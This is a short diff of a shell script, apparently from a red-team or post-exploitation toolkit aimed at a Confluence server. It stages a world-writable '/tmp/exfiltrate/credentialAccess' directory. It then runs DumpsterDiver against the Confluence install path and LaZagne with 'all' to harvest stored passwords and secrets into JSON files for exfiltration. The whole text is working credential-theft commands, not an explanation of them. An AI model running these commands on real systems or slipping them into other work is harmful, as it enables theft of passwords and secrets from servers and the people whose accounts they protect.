@@ -13,7 +13,7 @@
 mkdir -m 777 -p /tmp/exfiltrate/credentialAccess
 
 #Dumpster Diver
-/bin/bash -c 'cd /tmp/DumpsterDiver-master; source "env/bin/activate"; python3 DumpsterDiver.py -p / -s -o /tmp/exfiltrate/credentialAccess/DumpsterDiver-$HOSTNAME.$(date +%Y%m%d).json &'
+/bin/bash -c 'cd /tmp/DumpsterDiver-master; source "env/bin/activate"; python3 DumpsterDiver.py -p /opt/atlassian/confluence -s -o /tmp/exfiltrate/credentialAccess/DumpsterDiver-$HOSTNAME.$(date +%Y%m%d).json &'
 
 #LaZagne
 /bin/bash -c 'cd /tmp/LaZagne-master; source "env/bin/activate"; python3 Linux/laZagne.py all -v -oJ -output /tmp/exfiltrate/credentialAccess'
